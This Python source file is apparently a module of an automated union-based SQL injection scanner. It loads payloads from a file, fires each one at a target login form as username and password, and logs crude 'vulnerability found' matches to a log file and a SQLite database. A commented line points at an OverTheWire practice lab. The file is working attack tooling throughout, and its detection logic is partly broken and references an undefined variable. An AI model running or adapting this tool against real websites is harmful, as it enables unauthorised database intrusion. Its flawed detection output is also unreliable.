import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
import socket
# from database import create_database_for_Captures
import sqlite3
import logging


#################################################################
attack_type = "Union Select injection"
#################################################################

logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)

####################################33
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
UNIOn_capture = []
########################################


""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""





async def union_based_SQL_inj(urls):
    """UNION SELECT is a technique used in SQL injection attacks to combine the results of two or more SELECT statements into a single result set. """
    """This attack is when we inject some malicious code to the database and extract some code out of it. """
    try:
        global pattern,htmlpattern
        done = False
        filename = "UnionselectInj.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_directory, filename)

        with open(file_path, "r") as file:
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows)
            print(Fore.RED + str(sorted_payload))
            requests.packages.urllib3.disable_warnings()  # Disable SSL warnings
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls } \n Do you want to send the payload to the website according to the above payload? ")
                logging.info(f"The host is up:{urls},Time:{datetime.now()},attack:{attack_type}")
                
                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"):
                        #############################################################33
                        params = {
                            "username": line,
                            "password": line
                        }
                        ##############################################################################
                        # print(line)
                        ack = requests.post(url=urls, data=params,verify=False)
                        print(f"[{datetime.now()}]","|Current payload: |", line,"|with status code|:",ack.status_code,"|Attack:|",attack_type)
                        print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                        await asyncio.sleep(5)
                        logging.info(f"Sending payload:{line} to the website:{urls},attack:{attack_type},time:{datetime.now()}")
                        if "error" in ack.text:
                            print(Fore.RED + "|Vulnerability found|:", ack.text)
                            
                        vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                        htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE)
                        if vuln:
                            print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found: |", ack.text," | with the count of: |",len(vuln),"|Attack:|",attack_type)
                            logging.info(f"Could find some errors in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
                            await asyncio.sleep(3)
                            
                        
                        if htmlVULN:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"with the count of:",len(htmlVULN),"|Attack:|",attack_type)
                            logging.info(f"Could find some errors in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
                            await asyncio.sleep(3)
                        
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found|:", ack.text,"|with the count of:|",len(htmlVULN),"|Attack:|",attack_type)
                            logging.info(f"Could find some errors in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
                            await asyncio.sleep(3)
                        
                        if errword:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"|with the count of:|",len(htmlVULN),"|Attack:|",attack_type)
                            logging.info(f"Could find some errors in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
                            await asyncio.sleep(3)
                            
                        
                            
                    if ack.status_code == 302:
                        print(f"[{datetime.now()}]","|[INFO]Could inject the injectable are to the website,keyword:|",params["username"],"|Attack:|",attack_type)
                        logging.info(f"Could inject the injectable are to the website,keyword:{params['username']},Time:{datetime.now()},attack:{attack_type}")
                        done = True
                        
                        
                    if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:

                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|",attack_type)
                        logging.info(f"Could connect to the website but did found injectable area on the website:{urls},Time:{datetime.now()},attack:{attack_type}")
                        
                elif ack.status_code == 200:
                    print(f"[{datetime.now()}]",Fore.RED+"[ERROR]Could connect to the website but did not found any injectable area on the website.","|Attack:|",attack_type)
                    logging.info(f"Could connect to the website but did not found any injectable area on the website:{urls},Time:{datetime.now()},attack:{attack_type}")
                        
                else:
                    # continue
                    pass
                        
            else:
                print(f"[{datetime.now()}]","[ERROR]Could not connect to the website.Host seems to be down or not available at the time","|Attack:|",attack_type)
                
        
        # await create_database_for_Captures()
        conn = sqlite3.connect("SQLJresult.db")
        cur = conn.cursor()

        sql = "INSERT INTO Datas (Data,attacktype) VALUES (?,?)"
        # values = [attack_type,(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]
        values = [(attack_type, str(ack.text)), (attack_type, str(headers)), (attack_type, str(ack.status_code)), (attack_type, str(vuln)), (attack_type, str(htmlVULN)), (attack_type, str(errword)), (attack_type, str(word)), (attack_type, str(req.status_code)), (attack_type, str(ack.text))]

        cur.executemany(sql, values)

        conn.commit()
        conn.close()
                    
    
    except ConnectionAbortedError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionAbortedError:",e,"|Attack:|",attack_type)
        logging.error(f"Error:{e},time:{datetime.now()}")
    except ConnectionError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionError:",e,"|Attack:|",attack_type)
        logging.error(f"Error:{e},time:{datetime.now()}")
        
    except ConnectionRefusedError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionRefusedError",e,"|Attack:|",attack_type)
        logging.error(f"Error:{e},time:{datetime.now()}")
        
    except ConnectionResetError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionResetError:",e,"|Attack:|",attack_type)
        logging.error(f"Error:{e},time:{datetime.now()}")
        
    except KeyboardInterrupt:
        pass
        
    except UnboundLocalError:
        pass
    
    except Exception as e:
        print(f"[{datetime.now()}]",f"Error: {str(e)}","|Attack:|",attack_type)
        logging.error(f"Error:{str(e)},time:{datetime.now()},attack:{attack_type}")
        
    # except MemoryError as e:
    #     print(f"[{datetime.now()}]",Fore.RED+"[ERROR]There is an issue with you RAM:",e)
        
    except MemoryError:
        import psutil
        # Get the system memory information
        memory = psutil.virtual_memory()

        # Calculate the threshold for 80% memory usage
        threshold = memory.total * 0.9

        # Check if the used memory is greater than the threshold
        Err =  memory.used <= threshold
        while not Err:
            memory = psutil.virtual_memory()
            Err = memory.used <= threshold
            print("Please Release you RAM space to continue the application","|Attack:|",attack_type)
            await asyncio.sleep(5)
# asyncio.run(Memory_handling())
    
 
        
    finally:
        pass
        # global UNIOn_capture
        # print(f"[{datetime.now()}]",Fore.BLUE+f"""[INFO] The final result of html response:
        #                    \n{ack.text}\n     """)
        # UNIOn_capture.append(ack.text)
        
                
# asyncio.run(union_based_SQL_inj("https://redtiger.labs.overthewire.org/level1.php"))
# if __name__ != "main":
#     pass      